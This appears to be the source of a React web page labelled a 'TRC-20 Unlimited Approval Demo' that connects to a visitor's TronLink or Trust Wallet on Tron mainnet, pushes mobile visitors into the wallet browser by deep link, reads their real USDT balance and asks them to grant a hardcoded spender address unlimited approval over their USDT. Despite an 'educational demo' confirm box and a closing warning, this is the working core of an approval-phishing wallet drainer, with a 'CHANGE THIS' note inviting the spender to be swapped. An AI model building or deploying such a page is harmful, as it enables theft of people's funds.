import React, { useEffect, useState } from "react";

// ── CONFIG ───────────────────────────────────────────────
const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT mainnet

// !!! MUST be valid Tron address starting with T !!!
const SPENDER_ADDRESS = "TXexNC6iyH8yBFGDkynAHgjESx3DAPeYtF"; // ← CHANGE THIS!

const TRC20_ABI = [
  "function approve(address _spender, uint256 _value) returns (bool)",
  "function balanceOf(address _owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function allowance(address _owner, address _spender) view returns (uint256)",
];

const MAX_UINT256 =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

function App() {
  const [wallet, setWallet] = useState(null);
  const [tronWebReady, setTronWebReady] = useState(false);
  const [tokenContract, setTokenContract] = useState(null);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(1);

  const addLog = (msg) => setLogs((prev) => [...prev, msg]);

  // ── Wait for TronWeb injection ───────────────────────────
  useEffect(() => {
    let mounted = true;

    const checkTronWeb = () => {
      if (window.tronWeb?.defaultAddress?.base58) {
        if (mounted) {
          addLog("✅ TronLink / Trust Wallet detected");
          setTronWebReady(true);
        }
      }
    };

    checkTronWeb();

    const interval = setInterval(checkTronWeb, 600);

    // Deep link fallback (mobile)
    if (!window.tronWeb && /Mobi|Android|iPhone/i.test(navigator.userAgent)) {
      const url = encodeURIComponent(window.location.href);
      window.location.href = `tronlink://open_url?url=${url}`;
      // Trust fallback
      setTimeout(() => {
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${url}`;
      }, 1800);
    }

    return () => {
      mounted = false;
      clearInterval(interval);
    };
  }, []);

  const connectWallet = async () => {
    if (!window.tronWeb?.defaultAddress?.base58) {
      addLog("❌ Please open this page inside Trust Wallet / TronLink");
      return;
    }

    try {
      setLoading(true);
      addLog("Connecting...");

      const address = window.tronWeb.defaultAddress.base58;
      if (!address) throw new Error("No address");

      // Better network check
      const node = await window.tronWeb.trx.getNodeInfo();
      const chainId = Number(node?.config?.chain?.chainId || 0);
      if (chainId !== 195) {
        addLog("⚠️ Please switch to **Tron Mainnet** (chainId 195)");
        return;
      }

      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);

      // Use BigInt for safety
      const balanceRaw = await contract.balanceOf(address).call();
      const decimals = await contract.decimals().call();

      const balance = Number(balanceRaw) / 10 ** Number(decimals);

      setTokenContract(contract);
      setWallet({
        address,
        short: address.slice(0, 6) + "..." + address.slice(-6),
        balance: isNaN(balance) ? "?.??" : balance.toFixed(6),
      });

      addLog("Wallet connected ✓");
      setStep(2);
    } catch (err) {
      console.error(err);
      addLog("❌ Connection failed: " + (err.message || "unknown error"));
    } finally {
      setLoading(false);
    }
  };

  const doUnlimitedApprove = async () => {
    if (!tokenContract) return;

    try {
      setLoading(true);
      addLog("Preparing approval...");

      if (
        !window.confirm(
          "EDUCATIONAL DEMO ONLY!\n\n" +
            "This will APPROVE unlimited spending for the spender address.\n" +
            "No tokens will be moved right now!\n\nContinue?"
        )
      ) {
        addLog("Cancelled by user");
        return;
      }

      addLog("Sending approve transaction...");

      const txID = await tokenContract
        .approve(SPENDER_ADDRESS, MAX_UINT256)
        .send({
          feeLimit: 40_000_000, // 40 TRX — usually enough
          shouldPollResponse: true,
        });

      addLog("Transaction successful!");
      addLog(`TxID → ${txID}`);
      addLog("🚨 Unlimited approval has been granted!");

      setStep(3);
    } catch (err) {
      console.error(err);
      const msg = err.message || "unknown error";

      if (msg.includes("reject") || msg.includes("canceled")) {
        addLog("❌ User rejected transaction");
      } else if (msg.includes("INSUFFICIENT_ENERGY")) {
        addLog("❌ Not enough energy — need TRX or freeze for energy");
      } else {
        addLog("❌ Failed: " + msg);
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-950 text-white flex items-center justify-center p-4">
      <div className="w-full max-w-lg bg-zinc-900 rounded-2xl p-6 shadow-2xl border border-zinc-800">
        <h1 className="text-2xl font-bold text-center mb-6 text-blue-400">
          TRC-20 Unlimited Approval Demo
        </h1>

        {/* ── LOGS ── */}
        {logs.length > 0 && (
          <div className="bg-black/60 p-4 rounded-lg mb-6 text-sm font-mono max-h-64 overflow-y-auto border border-zinc-700">
            {logs.map((log, i) => (
              <div key={i} className="py-0.5">
                {log}
              </div>
            ))}
          </div>
        )}

        {!tronWebReady && (
          <div className="bg-red-900/40 p-4 rounded-lg mb-6 text-center">
            Please open this page inside <b>Trust Wallet</b> or <b>TronLink</b>
          </div>
        )}

        {step === 1 && tronWebReady && (
          <button
            onClick={connectWallet}
            disabled={loading}
            className={`w-full py-4 rounded-xl font-bold text-lg transition ${
              loading
                ? "bg-gray-700 cursor-not-allowed"
                : "bg-blue-600 hover:bg-blue-700"
            }`}
          >
            {loading ? "Connecting..." : "Connect Wallet"}
          </button>
        )}

        {step === 2 && wallet && (
          <>
            <div className="bg-zinc-800 p-4 rounded-lg mb-6 space-y-2">
              <div>Address: <span className="font-mono">{wallet.short}</span></div>
              <div>Balance: <span className="text-green-400">{wallet.balance}</span> USDT</div>
            </div>

            <button
              onClick={doUnlimitedApprove}
              disabled={loading}
              className={`w-full py-4 rounded-xl font-bold text-lg transition ${
                loading ? "bg-gray-700" : "bg-red-600 hover:bg-red-700"
              }`}
            >
              {loading ? "Waiting..." : "Approve Unlimited Spending"}
            </button>
          </>
        )}

        {step === 3 && (
          <div className="bg-red-950/50 border border-red-700 p-5 rounded-lg text-center">
            <p className="text-red-300 font-bold text-lg mb-2">
              WARNING — Unlimited Approval Granted!
            </p>
            <p className="text-sm text-red-200/90">
              Anyone with the spender address can now spend ALL your tokens at any time.
              <br />
              <strong>This is extremely dangerous in real life!</strong>
            </p>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;